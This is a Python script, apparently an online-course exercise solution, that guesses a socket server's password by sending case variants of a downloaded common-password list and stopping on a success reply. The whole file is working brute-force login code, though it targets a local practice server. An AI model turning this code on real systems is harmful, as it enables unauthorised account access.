"""
Finds the correct password using the list of typical passwords.
> python hack.py localhost 9090
qWeRTy
"""
import sys
from socket import socket
from itertools import product
from string import ascii_lowercase
# import csv  # comment-out of use local file reading
import requests  # for remote file reading


# read and check the address from cmd line
def read_address():
    if len(sys.argv) != 3:
        sys.exit("Usage: python hack.py localhost 9090")
    else:
        # argv[1] is a IP address; argv[2] is a port
        address = (sys.argv[1], int(sys.argv[2]))
        return address


# use this way to read the file if the file is stored locally
# with open("passwords.txt", 'r', newline='') as p:
#     passwords_list = []
#     reader = csv.reader(p, delimiter=' ', quotechar='|')
#     for i in reader:
#         passwords_list.append(', '.join(i))

# for reading a remote file
password_link = requests.get("https://stepik.org/media/attachments/lesson/255258/passwords.txt")
if password_link.status_code == 200:
    file_content = password_link.text
    passwords_list = []
    for i in file_content.split():
        passwords_list.append(i.strip('\n'))


# (stage 2)
# hack by trying all combinations of lowercase alphanumeric values
def generate_password():
    numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
    alphabet = list(ascii_lowercase)
    alphanum = numbers + alphabet

    n = 1
    while True:
        alphanum_product = product(alphanum, repeat=n)
        alphanum_iter = iter(alphanum_product)
        for i in alphanum_iter:
            yield i
        n += 1


# (stage 3)
# hack by using the dictionary of standard passwords, and 
# trying to change the cases of different letters
def dict_passwords():
    for r in passwords_list:
        if r.isalpha():
            for password_try in product(*([letter.lower(), letter.upper()] for letter in r)):
                yield "".join(password_try)


# create a socket and connect to server
address1 = read_address()
hack_socket = socket()
hack_socket.connect(address1)

# try passwords generated from dict
password = dict_passwords()
for k in password:
    password_str = ''.join(str(j) for j in k)
    password_encoded = password_str.encode()
    hack_socket.send(password_encoded)
    response = hack_socket.recv(1024)
    response_decoded = response.decode()
    if response_decoded == "Connection success!":
        print(password_str)
        sys.exit()

hack_socket.close()
